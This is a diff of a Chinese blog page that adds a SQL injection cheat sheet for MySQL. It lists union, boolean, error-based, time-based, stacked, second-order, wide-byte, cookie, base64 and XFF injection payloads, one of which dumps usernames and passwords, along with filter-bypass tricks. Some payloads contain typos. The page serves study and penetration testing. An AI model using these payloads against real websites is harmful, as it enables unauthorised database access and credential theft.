@@ -257,7 +257,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-08-31 10:47:47'>2020-08-31 10:42</time>
+            发布时间 : <time class="date" title='最后更新: 2020-08-31 10:56:41'>2020-08-31 10:42</time>
         
     </div>
     <div class="article-meta">
@@ -279,7 +279,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="toc-text">0x01 什么是SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">0x02 SQL注入的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%88%86"><span class="toc-text">按变量类型分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89HTTP%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E5%88%86"><span class="toc-text">按HTTP提交方式分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%88%86"><span class="toc-text">按注入方式分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98"><span class="toc-text">编码问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E8%AF%86%E5%88%AB%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">0x03识别后台数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0"><span class="toc-text">根据操作系统平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEweb%E8%AF%AD%E8%A8%80"><span class="toc-text">根据web语言</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-MySQL-5-0%E4%BB%A5%E4%B8%8A%E5%92%8CMySQL-5-0%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">0x05 基本手工注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MySQL-gt-5-0"><span class="toc-text">1. MySQL &gt;&#x3D; 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">（1）获取字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">（2）获取系统数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">（3）获取当前数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="toc-text">（4）获取数据库中的表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text">（5）获取表中的字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-text">（6）获取各个字段值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL-lt-5-0"><span class="toc-text">2.MySQL &lt; 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">（1）基于布尔的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">（2）基于时间的盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">0x06 常用注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union%E6%B3%A8%E5%85%A5"><span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Boolean%E6%B3%A8%E5%85%A5"><span class="toc-text">Boolean注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-floor-%E5%92%8Crand"><span class="toc-text">1 floor()和rand()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-extractvalue"><span class="toc-text">2 extractvalue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-updatexml"><span class="toc-text">3 updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-geometrycollection"><span class="toc-text">4 geometrycollection()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-multipoint"><span class="toc-text">5 multipoint()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-polygon"><span class="toc-text">6 polygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-multipolygon"><span class="toc-text">7 multipolygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-linestring"><span class="toc-text">8 linestring()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-multilinestring"><span class="toc-text">9 multilinestring()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-exp"><span class="toc-text">10 exp()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">时间注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E6%B3%A8%E5%85%A5"><span class="toc-text">base64注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="toc-text">XFF注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-text">0x07 SQL注入绕过技术</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -295,10 +295,170 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>123</p>
+        <h2 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a><strong>0x01 什么是SQL注入</strong></h2><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p>
+<h2 id="0x02-SQL注入的分类"><a href="#0x02-SQL注入的分类" class="headerlink" title="0x02 SQL注入的分类"></a>0x02 SQL注入的分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<h3 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h3><ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>Cookie注入</li>
+</ul>
+<h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul>
+<li><p>报错注入</p>
+</li>
+<li><p>盲注</p>
+</li>
+<li><ul>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+</ul>
+</li>
+<li><p>union注入</p>
+</li>
+</ul>
+<h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul>
+<li>宽字节注入</li>
+</ul>
+<h2 id="0x03识别后台数据库"><a href="#0x03识别后台数据库" class="headerlink" title="0x03识别后台数据库"></a>0x03识别后台数据库</h2><h3 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h3><p><strong>sql server</strong>：Windows（IIS)</p>
+<p><strong>MySQL</strong>：Apache</p>
+<h3 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h3><p><strong>Microsoft SQL Server</strong>：ASP和.Net</p>
+<p><strong>MySQL</strong>：PHP</p>
+<p><strong>Oracle/MySQL</strong>：java</p>
+<p>(以下是对mysql数据库的总结，其他类型数据库会不定时更新)</p>
+<h2 id="0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</h2><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–<strong>INFORMATION_SCHEMA</strong> ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而5.0以下没有。</p>
+<p><strong>information_schema</strong></p>
+<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>
+<p><strong>SCHEMATA</strong></p>
+<p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p>
+<p><strong>TABLES</strong></p>
+<p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>
+<p><strong>COLUMNS</strong></p>
+<p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>
+<h2 id="0x05-基本手工注入流程"><a href="#0x05-基本手工注入流程" class="headerlink" title="0x05 基本手工注入流程"></a>0x05 基本手工注入流程</h2><p>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p>
+<h3 id="1-MySQL-gt-5-0"><a href="#1-MySQL-gt-5-0" class="headerlink" title="1. MySQL &gt;= 5.0"></a>1. MySQL &gt;= 5.0</h3><h3 id="（1）获取字段数"><a href="#（1）获取字段数" class="headerlink" title="（1）获取字段数"></a>（1）获取字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n  &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）获取系统数据库名"><a href="#（2）获取系统数据库名" class="headerlink" title="（2）获取系统数据库名"></a>（2）获取系统数据库名</h3><p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）获取当前数据库名"><a href="#（3）获取当前数据库名" class="headerlink" title="（3）获取当前数据库名"></a>（3）获取当前数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）获取数据库中的表"><a href="#（4）获取数据库中的表" class="headerlink" title="（4）获取数据库中的表"></a>（4）获取数据库中的表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
+
+<h3 id="（5）获取表中的字段"><a href="#（5）获取表中的字段" class="headerlink" title="（5）获取表中的字段"></a>（5）获取表中的字段</h3><p>这里假设已经获取到表名为user</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（6）获取各个字段值"><a href="#（6）获取各个字段值" class="headerlink" title="（6）获取各个字段值"></a>（6）获取各个字段值</h3><p>这里假设已经获取到表名为user，且字段为username和password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-MySQL-lt-5-0"><a href="#2-MySQL-lt-5-0" class="headerlink" title="2.MySQL &lt; 5.0"></a>2.MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工枚举爆破（二分法思想）。</p>
+<p>该方式通常用于盲注。</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><strong>length(str)</strong> ：返回字符串str的长度</p>
+<p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
+<p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p>
+<p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p>
+<p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p>
+<p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p>
+<h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 &#x2F;*判断数据库名的第一个字符的ascii值是否大于64*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 union select if(SUBSTRING(user(),1,4)&#x3D;&#39;root&#39;,sleep(4),1),null,null &#x2F;*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-常用注入方式"><a href="#0x06-常用注入方式" class="headerlink" title="0x06 常用注入方式"></a>0x06 常用注入方式</h2><p>注释符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- (有空格)或--+</span><br><span class="line">&#x2F;**&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>内联注释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*！...*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D;-1 union select 1,2,3   &#x2F;*获取字段*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; substr(database(),1,1)&#x3D;&#39;t&#39;--+     &#x2F;*判断数据名长度*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="1-floor-和rand"><a href="#1-floor-和rand" class="headerlink" title="1 floor()和rand()"></a>1 floor()和rand()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       &#x2F;*利用错误信息得到当前数据库名*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2 extractvalue()"></a>2 extractvalue()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3 updatexml()"></a>3 updatexml()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4 geometrycollection()"></a>4 geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5 multipoint()"></a>5 multipoint()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6 polygon()"></a>6 polygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7 multipolygon()"></a>7 multipolygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8 linestring()"></a>8 linestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9 multilinestring()"></a>9 multilinestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-exp"><a href="#10-exp" class="headerlink" title="10 exp()"></a>10 exp()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1 and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39;;select if(sub(user(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test’，接下来访问xxx.php?username=test’，页面返回id=22；</p>
+<p>接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p>
+<p>访问xxx.php?id=test’ union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li><input disabled type="checkbox"> 查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数</li>
+<li><input disabled type="checkbox"> 数据库的编码为GBK</li>
+</ul>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; -1%DF&#39; union select 1,user(),3,%23</span><br></pre></td></tr></table></figure>
+
+<p>在上述条件下，单引号’被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p>
+<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: id &#x3D; 1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>对参数进行base64编码，再发送请求。</p>
+<p>说明：id=1’，1的base64编码为<code>MSc=</code>，而<code>=</code>的url编码为<code>%3d</code>，所以得到以下结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;MSc%3d</span><br></pre></td></tr></table></figure>
+
+<h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forward-For：127.0.0.1&#39; select 1,2,user()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-SQL注入绕过技术"><a href="#0x07-SQL注入绕过技术" class="headerlink" title="0x07 SQL注入绕过技术"></a>0x07 SQL注入绕过技术</h2><ul>
+<li><p><strong>大小写绕过</strong></p>
+</li>
+<li><p><strong>双写绕过</strong></p>
+</li>
+<li><p><strong>编码绕过</strong>（url全编码、十六进制）</p>
+</li>
+<li><p><strong>内联注释绕过</strong></p>
+</li>
+<li><p><strong>关键字替换</strong></p>
+</li>
+<li><ul>
+<li><p><strong>逗号绕过</strong></p>
+<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
+<p>limit中可以利用offset来摆脱对逗号的利用</p>
+</li>
+<li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p>
+</li>
+<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
+</li>
+<li><p><strong>空格绕过</strong>（用括号，+等绕过）</p>
+</li>
+</ul>
+</li>
+<li><p><strong>等价函数绕过</strong></p>
+</li>
+<li><ul>
+<li>hex()、bin()=ascii()</li>
+<li>concat_ws()=group_concat()</li>
+<li>mid()、substr()=substring()</li>
+</ul>
+</li>
+<li><p><strong>http参数污染</strong>（<code>id=1 union select+1,2,3+from+users+where+id=1–</code>变为<code>id=1 union select+1&amp;id=2,3+from+users+where+id=1–</code>）</p>
+</li>
+</ul>
 
       
-       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达,也可以邮件至 jaytp@qq.com </span>
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达,也可以邮件至 1824582879@qq.com </span>
     </div>
 </article>
 
